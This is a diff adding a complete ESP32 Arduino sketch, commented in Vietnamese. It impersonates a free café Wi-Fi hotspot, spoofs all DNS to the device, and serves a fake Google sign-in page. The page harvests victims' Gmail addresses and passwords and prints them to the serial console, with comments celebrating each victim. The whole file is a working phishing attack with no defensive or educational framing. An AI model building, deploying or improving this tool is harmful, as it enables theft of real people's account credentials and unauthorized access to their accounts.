@@ -1,0 +1,155 @@
+#include <WiFi.h>
+#include <DNSServer.h>
+#include <WebServer.h>
+
+// ==========================================
+// 1. CẤU HÌNH TRẠM MỒI NHỬ GMAIL PHISHING (OPEN - KHÔNG MẬT KHẨU)
+// ==========================================
+const char* AP_SSID = "Highlands_Coffee_Free"; 
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 4, 1);
+
+DNSServer dnsServer;
+WebServer webServer(80);
+
+// ==========================================
+// 2. GIAO DIỆN PHISHING GMAIL NHÚNG FLASH
+// ==========================================
+const char index_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng Nhập bằng Google</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; width: 100%; max-width: 450px; text-align: center; box-sizing: border-box; }
+        .logo { font-size: 26px; font-weight: 500; color: #202124; margin-bottom: 10px; }
+        .logo span:nth-child(1) { color: #4285F4; }
+        .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; }
+        .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; }
+        .logo span:nth-child(6) { color: #EA4335; }
+        .desc { font-size: 16px; color: #202124; margin-bottom: 25px; line-height: 1.5; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; transition: border 0.2s; }
+        input[type="text"]:focus, input[type="password"]:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
+        button { width: 100%; padding: 10px 24px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.3s; margin-top: 15px; height: 36px; }
+        button:hover { background-color: #1b66c9; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); }
+        .footer { margin-top: 30px; font-size: 12px; color: #5f6368; display: flex; justify-content: space-between; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">
+            <span>G</span><span>o</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+        <p class="desc">Vui lòng đăng nhập tài khoản Gmail để tiếp tục sử dụng mạng Wi-Fi miễn phí tốc độ cao.</p>
+        <form action="/login" method="POST">
+            <div class="input-group">
+                <input type="text" name="email" placeholder="Email hoặc số điện thoại" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Nhập mật khẩu của bạn" required>
+            </div>
+            <button type="submit">Tiếp theo</button>
+        </form>
+        <div class="footer">
+            <span>Tiếng Việt</span>
+            <span>Trợ giúp &nbsp; Bảo mật &nbsp; Điều khoản</span>
+        </div>
+    </div>
+</body>
+</html>
+)rawliteral";
+
+const char success_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kết nối thành công</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center;}
+        h1 { color: #42b72a; }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>✅ Xác Thực Thành Công!</h1>
+        <p>Hệ thống đã ghi nhận thông tin tài khoản của bạn.</p>
+        <p>Vui lòng tắt cửa sổ này.</p>
+    </div>
+</body>
+</html>
+)rawliteral";
+
+// ==========================================
+// 3. HÀM XỬ LÝ PHISHING & CAPTIVE PORTAL
+// ==========================================
+void handleRoot() {
+    webServer.send_P(200, "text/html", index_html);
+}
+
+void handleLogin() {
+    if (webServer.hasArg("email") && webServer.hasArg("password")) {
+        String email = webServer.arg("email");
+        String password = webServer.arg("password");
+        
+        Serial.println("\n================================================");
+        Serial.println("🔥 BINGO! CÓ NẠN NHÂN SẬP BẪY PHISHING GMAIL 🔥");
+        Serial.print("Tài khoản : "); Serial.println(email);
+        Serial.print("Mật khẩu  : "); Serial.println(password);
+        Serial.println("================================================\n");
+        
+        webServer.send_P(200, "text/html", success_html);
+    } else {
+        webServer.send_P(200, "text/html", index_html);
+    }
+}
+
+void handleNotFound() {
+    if (webServer.hostHeader() != "192.168.4.1") {
+        webServer.sendHeader("Location", String("http://192.168.4.1/"), true);
+        webServer.send(302, "text/plain", "");
+    } else {
+        webServer.send_P(200, "text/html", index_html);
+    }
+}
+
+// ==========================================
+// 4. KHỞI TẠO CAPTIVE PORTAL PHISHING
+// ==========================================
+void setup() {
+    Serial.begin(115200);
+    delay(1000);
+    Serial.println("\n[*] Đang khởi động ESP32 Gmail Phishing Captive Portal...");
+
+    // Bật chế độ Access Point độc lập (Không kết nối STA, Không NAPT -> KHÔNG BAO GIỜ CRASH!)
+    WiFi.mode(WIFI_AP);
+    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+    WiFi.softAP(AP_SSID);
+
+    Serial.print("[+] Đã phát Wi-Fi mồi nhử (OPEN): ");
+    Serial.println(AP_SSID);
+    Serial.print("[+] IP Captive Portal: ");
+    Serial.println(apIP);
+
+    // Bật DNS Spoofer & Web Server Phishing
+    dnsServer.start(DNS_PORT, "*", apIP);
+    webServer.on("/", HTTP_GET, handleRoot);
+    webServer.on("/login", HTTP_POST, handleLogin);
+    webServer.onNotFound(handleNotFound);
+    webServer.begin();
+
+    Serial.println("[+] Web Server Phishing đang chạy trên cổng 80!");
+    Serial.println("[*] Sẵn sàng thu thập Gmail & Mật khẩu trên Serial Monitor!\n");
+}
+
+void loop() {
+    dnsServer.processNextRequest();
+    webServer.handleClient();
+}
